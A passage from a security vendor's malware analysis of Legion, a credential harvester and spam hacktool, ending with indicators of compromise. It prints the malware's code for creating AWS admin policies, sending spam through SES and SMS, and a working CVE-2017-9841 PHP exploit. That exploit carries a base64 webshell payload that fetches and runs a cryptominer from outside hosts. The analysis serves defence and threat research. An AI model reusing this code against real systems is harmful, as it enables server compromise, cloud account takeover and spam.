<p>An IAM group named SESAdminGroup is then created and the newly-created user is added. From there, Legion attempts to create a policy based on the <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html">AdministratorAccess</a> Amazon managed policy. This managed policy allows full access and can delegate permissions to all services and resources within AWS. This includes the management console, providing access has been activated for the user.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>def creat_new_group(iam_client, group_name='SESAdminGroup'):<br>
        try:<br>
                res = iam_client.create_group(GroupName=group_name)<br>
        except ClientError as e:<br>
                if e.response['Error']['Code'] == 'EntityAlreadyExists':<br>
                        result_str = get_random_string()<br>
                        group_name = "SESAdminGroup{}".format(result_str)<br>
                        res = iam_client.create_group(GroupName=group_name)<br>
        return res['Group']['GroupName']
</code><p><code>def creat_new_policy(iam_client, policy_name='AdministratorAccess'):<br> policy_json = {"Version": "2012-10-17","Statement":<br> [{"Effect": "Allow", "Action": "*","Resource": "*"}]}<br> try:<br> res = iam_client.create_policy(<br> PolicyName=policy_name,<br> PolicyDocument=json.dumps(policy_json)<br> )<br> except ClientError as e:<br> if e.response['Error']['Code'] == 'EntityAlreadyExists':<br> result_str = get_random_string()<br> policy_name = "AdministratorAccess{}".format(result_str)<br> res = iam_client.create_policy(PolicyName=policy_name,<br> PolicyDocument=json.dumps(policy_json)<br> )<br> return res['Policy']['Arn']</code></p></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>IAM group and policy creation code</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Consistent with the assumption that Legion is primarily concerned with cracking email services, the malware attempts to use the newly-created AWS IAM user to query Amazon Simple Email Service (SES) quota limits and even send a test email.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>def check(countsd, key, secret, region):<br>
        try:<br>
                out = ''<br>
                client = boto3.client('ses', aws_access_key_id=key, aws_secret_access_key=secret, region_name=region)<br>
                try:<br>
                        response = client.get_send_quota()<br>
                        frommail = client.list_identities()['Identities']<br>
                        if frommail:<br>
                                SUBJECT = "AWS Checker By @mylegion (Only Private Tools)"<br>
                                BODY_TEXT = "Region: {region}\r\nLimit: {limit}|{maxsendrate}|{last24}\r\nLegion PRIV8 Tools\r\n".format(key=key, secret=secret, region=region, limit=response['Max24HourSend'])<br>
                                CHARSET = "UTF-8"<br>
                                _to = emailnow</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>Snippet of code to send test email via AWS SES</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>SMS Hijacking Capability</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>One feature of Legion not covered by previous research is the ability to deliver SMS spam messages to users of mobile networks in the United States. To do this, the malware retrieves the area code for a US state of the user’s choosing from the website <a href="http://www.randomphonenumbers.com">www.randomphonenumbers.com</a>.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>To retrieve the area code, Legion uses Python’s BeautifulSoup HTML parsing library. A rudimentary number generator function is then used to build up a list of phone numbers to target.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>def generate(self):<br>
    print('\n\n\t{0}╭╼[ {1}Starting Service {0}]\n\t│'.format(fg[5], fg[6]))<br>
    url = f'https://www.randomphonenumbers.com/US/random_{self.state}_phone_numbers'.replace(' ', '%20')<br>
    print('\t{0}│ [ {1}WEBSITE LOADED{0} ] {2}{3}{0}'.format(fg[5], fg[2], fg[1], url))<br>
    query = requests.get(url)<br>
    soup = BeautifulSoup(query.text, 'html.parser')<br>
    list = soup.find_all('ul')[2]<br>
    urls = []<br>
    for a in list.find_all('a', href=True):<br>
        url = f'https://www.randomphonenumbers.com{a["href"]}'<br>
        print('\t{0}│ [ {1}PARSING URLS{0}   ] {2}{3}'.format(fg[5], fg[2], fg[1], url), end='\r')<br>
        urls.append(url)<br>
        time.sleep(0.01)<br>
    print(' ' * 100, end='\r')<br>
    print('\t{0}│ [ {1}URLS PARSED{0}    ] {2}{3}\n\t│'.format(fg[5], fg[3], fg[1], len(urls)), end='\r')
</code><p><code> def generate_number(area_code, carrier):<br> for char in string.punctuation:<br> carrier = carrier.replace(char, ' ')<br> numbers = ''<br> for number in [area_code + str(x) for x in range(0000, 9999)]:<br> if len(number) != 10:<br> gen = number.split(area_code)[1]<br> number = area_code + str('0' * (10-len(area_code)-len(gen))) + gen<br> numbers += number + '\n'<br> with open(f'Generator/Carriers/{carrier}.txt', 'a+') as file:<br> file.write(numbers)<br> </code></p></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>Web scraping and phone number generation code</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>To send the SMS messages themselves, the malware checks for saved SMTP credentials retrieved by one of the credential harvesting modules. A list of the carriers targeted is included in the table below.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:table {"align":"center"} --></p> 
<figure class="wp-block-table aligncenter"> 
 <table> 
  <tbody> 
   <tr> 
    <td class="has-text-align-center" data-align="center"><strong>US Mobile Carriers</strong></td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Alltel</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Amp'd Mobile</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">AT&amp;T</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Boost Mobile</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Cingular</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Cricket</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Einstein PCS</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Sprint</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">SunCom</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">T-Mobile</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">VoiceStream</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">US Cellular</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Verizon</td> 
   </tr> 
   <tr> 
    <td class="has-text-align-center" data-align="center">Virgin</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>while not is_prompt:<br>
    print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Choose Carrier to SPAM{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')<br>
    try:<br>
        prompt = int(input(''))<br>
        if prompt in [int(x) for x in carriers.keys()]:<br>
            self.carrier = carriers[str(prompt)]<br>
            is_prompt = True<br>
        else:<br>
            print('\t{0}[{1}!{0}]╾╼[{2}Please enter a valid choice!{0}]'.format(fg[5], fg[0], fg[2]), end='\r')<br>
            time.sleep(1)<br>
    except ValueError:<br>
        print('\t{0}[{1}!{0}]╾╼[{2}Please enter a valid choice!{0}]'.format(fg[5], fg[0], fg[2]), end='\r')<br>
        time.sleep(1)<br>
print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Please enter your message {0}| {2}160 Max Characters{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')<br>
self.message = input('')<br>
print('\t{0}┌╼[{1}USA SMS Sender{0}]╾╼[{2}Please enter sender email{0}]\n\t└─╼ '.format(fg[5], fg[0], fg[6]), end='')<br>
self.sender_email = input('')</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p><em>Carrier selection code example</em></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>PHP Exploitation</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Not content with simply harvesting credentials for the purpose of email and SMS spamming, Legion also includes traditional hacktool functionality. One such feature is the ability to exploit well-known PHP vulnerabilities to register a webshell or remotely execute malicious code. </p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>The malware uses several methods for this. One such method is posting a string preceded by &lt;?php and including base64-encoded PHP code to the path "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php". This is a well-known PHP unauthenticated RCE vulnerability, tracked as <a href="https://www.cvedetails.com/cve/CVE-2017-9841/">CVE-2017-9841</a>. It’s likely that Proof of Concept (PoC) code for this vulnerability was found online and integrated into the malware.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:loos-hcb/code-block {"langType":"python","langName":"Python"} --></p> 
<div class="hcb_wrap"> 
 <pre class="prism undefined-numbers lang-python" data-lang="Python"><code>path = "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"<br>
url = url + path<br>
phpinfo = "&lt;?php phpinfo(); ?&gt;"<br>
try:<br>
    requester_1 = requests.post(url, data=phpinfo, timeout=15, verify=False)<br>
    if "phpinfo()" in requester_1.text:<br>
        payload_ = '&lt;?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/'+pathname+'", "w") or die("Unable to open file!"); $code = "PD9waHAgZWNobyAnPGNlbnRlcj48aDE+TEVHSU9OIEVYUExPSVQgVjQgKE7Eg3ZvZGFyaSBQb3dlcik8L2gxPicuJzxicj4nLidbdW5hbWVdICcucGhwX3VuYW1lKCkuJyBbL3VuYW1lXSAnO2VjaG8nPGZvcm0gbWV0aG9kPSJwb3N0ImVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPic7ZWNobyc8aW5wdXQgdHlwZT0iZmlsZSJuYW1lPSJmaWxlIj48aW5wdXQgbmFtZT0iX3VwbCJ0eXBlPSJzdWJtaXQidmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoICRfUE9TVFsnX3VwbCddPT0iVXBsb2FkIil7aWYoQGNvcHkoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSl7ZWNobyc8Yj5MRUdJT04gRXhwbG9pdCBTdWNjZXNzITwvYj4nO31lbHNle2VjaG8nPGI+TEVHSU9OIEV4cGxvaXQgU3VjY2VzcyE8L2I+Jzt9fSBzeXN0ZW0oJ2N1cmwgLXMgLWsgMi41Ny4xMjIuMTEyL3JjZS9sb2FkIC1vIGFkaW5kZXgucGhwOyBjZCAvdG1wOyBjdXJsIC1PIDkxLjIxMC4xNjguODAvbWluZXIuanBnOyB0YXIgeHp2ZiBtaW5lci5qcGcgPiAvZGV2L251bGw7IHJtIC1yZiBtaW5lci5qcGc7IGNkIC54OyAuL3ggPiAvZGV2L251bGwnKTsKPz4="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("LEGION EXPLOIT V3"); ?&gt;'<br>
        send_payload = requests.post(url, data=payload_, timeout=15, verify=False)<br>
        if "LEGION EXPLOIT V3" in send_payload.text:<br>
            status_exploit = "Successfully"<br>
        else:<br>
            status_exploit = "Can't exploit"<br>
    else:<br>
        status_exploit = "May not vulnerable"<br>
</code></pre> 
</div> 
<p> 
 <!-- /wp:loos-hcb/code-block --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>Conclusion</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Legion is a general-purpose credential harvester and hacktool, designed to assist in compromising services for conducting spam operations via SMS and SMTP.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Analysis of the Telegram groups in which this malware is advertised suggests a relatively wide distribution. Two groups monitored by Cado researchers had a combined total of 5,000 members. While not every member will have purchased a licence for Legion, these numbers show that interest in such a tool is high. Related research indicates that there are a number of variants of this malware, likely with their own distribution channels.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Throughout the analysed code, Cado researchers encountered several Indonesian-language comments, suggesting that the developer is either Indonesian themselves or based there. In a function dedicated to PHP exploitation, a link to a Github Gist leads to a user named Galeh Rizky. This user’s profile suggests that they’re located in Indonesia, which ties in with the comments seen throughout the sample. It’s not clear whether Galeh Rizky is the developer behind Legion or their code just happens to be included in the sample, but it’s interesting nonetheless.</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:image {"align":"center","id":7218,"sizeSlug":"full","linkDestination":"none"} --></p> 
<figure class="wp-block-image aligncenter size-full"> 
 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Imported_Blog_Media/image2-33.png" alt="" class="wp-image-7218"> 
 <br> 
 <figcaption class="wp-element-caption"> 
  <em>Galeh Rizky’s Github Profile</em> 
 </figcaption> 
</figure> 
<p> 
 <!-- /wp:image --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>Since this malware relies heavily on misconfigurations in web server technologies and frameworks such as Laravel, it’s recommended that users of these technologies review their existing security processes and ensure that secrets are appropriately stored. Ideally, if credentials are to be stored in a .env file, this should be stored outside web server directories so that it’s inaccessible from the web.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>AWS users should be aware of Legion’s targeting of IAM and services such as SES. Previous research by Permiso indicates that the actor behind Legion changed the IAM user registration code to include an “Owner” tag with the hardcoded value “ms.boharas”. AWS administrators should be vigilant to the creation of user accounts with this tag.&nbsp;</p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:paragraph --></p> 
<p>For best practices on investigating and responding to threats in AWS cloud environments,&nbsp;<a href="https://offers.cadosecurity.com/ultimate-guide-to-incident-response-in-aws">check out our technical playbook.</a></p> 
<p> 
 <!-- /wp:paragraph --></p> 
<p> 
 <!-- wp:heading --></p> 
<h2>Indicators of Compromise (IoCs)</h2> 
<p> 
 <!-- /wp:heading --></p> 
<p> 
 <!-- wp:table --></p> 
<figure class="wp-block-table"> 
 <table> 
  <tbody> 
   <tr> 
    <td><strong>Filename</strong></td> 
    <td><strong>SHA256</strong></td> 
   </tr> 
   <tr> 
    <td>legion.py</td> 
    <td>fcd95a68cd8db0199e2dd7d1ecc4b7626532681b41654519463366e27f54e65a</td> 
   </tr> 
   <tr> 
    <td>legion.py (variant)</td> 
    <td>42109b61cfe2e1423b6f78c093c3411989838085d7e6a5f319c6e77b3cc462f3</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p> 
<p> 
 <!-- wp:table --></p> 
<figure class="wp-block-table"> 
 <table> 
  <tbody> 
   <tr> 
    <td><strong>User Agents</strong></td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36</td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50</td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36</td> 
   </tr> 
   <tr> 
    <td>Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36</td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0</td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36</td> 
   </tr> 
   <tr> 
    <td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36</td> 
   </tr> 
  </tbody> 
 </table> 
</figure> 
<p> 
 <!-- /wp:table --></p></span></div>
      
        <div class="topics">
          <span class="label">Tag(s): </span> 
           
            <a class="link" href="https://www.cadosecurity.com/blog/tag/cloud-investigations">Cloud Investigations</a>
            <span class="divider">|</span>  
           
            <a class="link" href="https://www.cadosecurity.com/blog/tag/research-threat-intel">Research &amp; Threat Intel</a>
              
          
        </div>
      
    </div>
    
    <!-- End Blog Post Body -->
  
    <!-- Blog Post Author -->
    
    <!-- End Blog Post Author -->  
  

  
  </section>

  <div id="hs_cos_wrapper_u4m-blog-post-cards" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
  
  
  


<section id="u4m-blog-post-cards" class="u4m-blog-post-cards u4m-blog-post-cards   
" style=" 
">


  
  




  

  

  

  

  

  



  

    
    <div class="top-wrapper">
      
        <h2 class="heading">More from the blog</h2>
      
      
      
        <a class="link" href="https://www.cadosecurity.com/blog">View All Posts</a>
      
    </div>
    
  
    <div class="wrapper">
      
        
        
  
            

  



  


 
  
 
<a class="blog-post-card" href="https://www.cadosecurity.com/blog/updates-to-legion-a-cloud-credential-harvester-and-smtp-hijacker">

  <div class="inner">
    <div class="featured-icon">
      <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/Custom/Blog%20and%20Resources/Announcements.svg" alt="Research &amp; Threat Intel icon" loading="lazy" width="40">
    </div> 

    <div class="content">

      
      <div class="topic-wrapper">
        <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/blog-icon.svg" alt="blog icon" width="10" height="10" loading="lazy">
        
        
            
              
                 <span class="topic">Research &amp; Threat Intel</span>
              
              
            
        
      </div>
      

      <h5 class="title">Updates to Legion: A Cloud Credential Harvester and SMTP Hijacker</h5>

      <span class="date">May 24, 2023</span>
    
      <p class="teaser">Cado Labs recently discovered and reported on an emerging cloud-focused hacktool, designed to harvest credentials from...</p>

      <div class="read-more"><span>Continue Reading</span></div>
    </div>
  </div>

</a>
        

  
            

  



   


 
  
 
<a class="blog-post-card" href="https://www.cadosecurity.com/blog/an-ongoing-aws-phishing-campaign">

  <div class="inner">
    <div class="featured-icon">
      <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/Custom/Blog%20and%20Resources/Announcements.svg" alt="blog post icon" loading="lazy" width="40">
    </div> 

    <div class="content">

      

      <h5 class="title">An Ongoing AWS Phishing Campaign</h5>

      <span class="date">June 10, 2020</span>
    
      <p class="teaser">Below we have analyzed an on-going campaign to steal AWS accounts through phishing. We’ve identified linked attacks, and...</p>

      <div class="read-more"><span>Continue Reading</span></div>
    </div>
  </div>

</a>
        

  
            

  



  


 
  
 
<a class="blog-post-card" href="https://www.cadosecurity.com/blog/how-we-sped-up-acquiring-forensic-data-from-aws-kubernetes-and-azure-kubernetes-services-by-10-times">

  <div class="inner">
    <div class="featured-icon">
      <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/Custom/Blog%20and%20Resources/Announcements.svg" alt="Cloud Investigations icon" loading="lazy" width="40">
    </div> 

    <div class="content">

      
      <div class="topic-wrapper">
        <img class="icon" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Icons/blog-icon.svg" alt="blog icon" width="10" height="10" loading="lazy">
        
        
            
              
                 <span class="topic">Cloud Investigations</span>
              
              
            
        
            
        
      </div>
      

      <h5 class="title">How we Sped up Acquiring Forensic Data From Managed Kubernetes Services by 97% by Rebuilding the SDK</h5>

      <span class="date">May 25, 2023</span>
    
      <p class="teaser">In June 2022, we accomplished a major breakthrough by integrating container level support for AKS and EKS into the Cado...</p>

      <div class="read-more"><span>Continue Reading</span></div>
    </div>
  </div>

</a>
        


      
  
      
      
    
      
           
      
      
         
      
    </div>  
  </section></div>
  <div id="hs_cos_wrapper_u4m-subscribe" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">




<section id="u4m-subscribe" class="u4m-subscribe u4m-subscribe   
" style=" 
">



  




  

  

  

  

  

  




<div class="wrapper">
  <div class="inner">
    <img data-aos="fade-right" data-aos-duration="800" class="top-image" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Images/cloud-top.svg" alt="cloud image" loading="lazy">
    <img data-aos="fade-left" data-aos-duration="800" class="left-image" src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Images/Clouds/subscribe-cloud.svg" alt="cloud image" loading="lazy">
    <div class="intro">
      <h3 class="heading">Subscribe to Our Blog</h3>
      <p class="subheading">To stay up to date on the latest from Cado Security, subscribe to our blog today.</p>
    </div>

    <div class="form-area" data-blog-id="156179862661">
      
        <span id="hs_cos_wrapper_u4m-subscribe_blog_subscribe" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_blog_subscribe" style="" data-hs-cos-general-type="widget" data-hs-cos-type="blog_subscribe">
<div id="hs_form_target_u4m-subscribe_blog_subscribe_9485"></div>



</span>
      
      
    </div>  
  </div>
</div>
</section></div>
</main>


    
        <div id="hs_cos_wrapper_u4m-footer" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module"><footer class="u4m-footer">

  <div class="inner">

      <div class="menu">
          <div id="hs_menu_wrapper_u4m-footer_" class="hs-menu-wrapper active-branch no-flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="default" data-menu-id="156295033863" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Product</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/platform" role="menuitem">Platform</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/environments" role="menuitem">Environments</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/product/integrations" role="menuitem">Integrations</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.cadosecurity.com/solutions" aria-haspopup="true" aria-expanded="false" role="menuitem">Solutions by Use Case</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/cross-cloud-investigations" role="menuitem">Cross Cloud Investigations</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/container-and-k8s-investigations" role="menuitem">Container &amp; K8s Investigations</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/endpoint-triage" role="menuitem">Endpoint Triage</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/saas-investigations" role="menuitem">SaaS Investigations</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/cloud-detection-and-response" role="menuitem">Cloud Detection &amp; Response (CDR)</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/evidence-preservation" role="menuitem">Evidence Preservation</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.cadosecurity.com/solutions" aria-haspopup="true" aria-expanded="false" role="menuitem">Solutions by Industry</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/dfir" role="menuitem">DFIR</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/security-operations-center" role="menuitem">SOC</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/mssp" role="menuitem">MSSPs</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/partners" role="menuitem">Partners</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/solutions/government" role="menuitem">Government</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="https://www.cadosecurity.com/resources" aria-haspopup="true" aria-expanded="false" role="menuitem">Resources</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/resources" role="menuitem">All Resources</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/blog" role="menuitem">Blog</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="/resources#playbook" role="menuitem">Playbooks</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="/resources#cheat-sheet" role="menuitem">Cheat Sheets</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/news-and-events" role="menuitem">News</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-community-edition" role="menuitem">Community</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://docs.cadosecurity.com/cado-response/intro" role="menuitem" target="_blank" rel="noopener">Documentation</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/wiki" role="menuitem">Wiki</a></li>
   </ul></li>
  <li class="hs-menu-item hs-menu-depth-1 hs-item-has-children" role="none"><a href="javascript:;" aria-haspopup="true" aria-expanded="false" role="menuitem">Company</a>
   <ul role="menu" class="hs-menu-children-wrapper">
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/about" role="menuitem">About</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/careers" role="menuitem">Careers</a></li>
    <li class="hs-menu-item hs-menu-depth-2" role="none"><a href="https://www.cadosecurity.com/cado-security-labs" role="menuitem">Cado Security Labs</a></li>
   </ul></li>
 </ul>
</div>
      </div>
   
      <div class="lower-menu">
        <div class="lower-links">
          <div class="social">
            <ul>
              
              
              <li>
                <a href="https://twitter.com/CadoSecurity" target="_blank" aria-label="Twitter" rel="noopener">
                  <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/x-icon.svg" alt="Twitter X icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://www.linkedin.com/company/cado-security/" target="_blank" aria-label="LinkedIn" rel="noopener">
                 <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/LinkedIn_Logo.svg" alt="LinkedIn icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://aws.amazon.com/marketplace/seller-profile?id=38874fd2-b585-412f-992a-cf111bbca38a" target="_blank" aria-label="Amazon" rel="noopener">
                  <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/Amazon_icon.svg" alt="Amazon icon" loading="lazy">
                </a>
              </li>
              
              <li>
                <a href="https://github.com/cado-security" target="_blank" aria-label="GitHub" rel="noopener">
                  <img src="https://14518100.fs1.hubspotusercontent-na1.net/hubfs/14518100/Web%20-%202024/Logos/github-mark.svg" alt="GitHub icon" loading="lazy">
                </a>
              </li>
              
              <li>
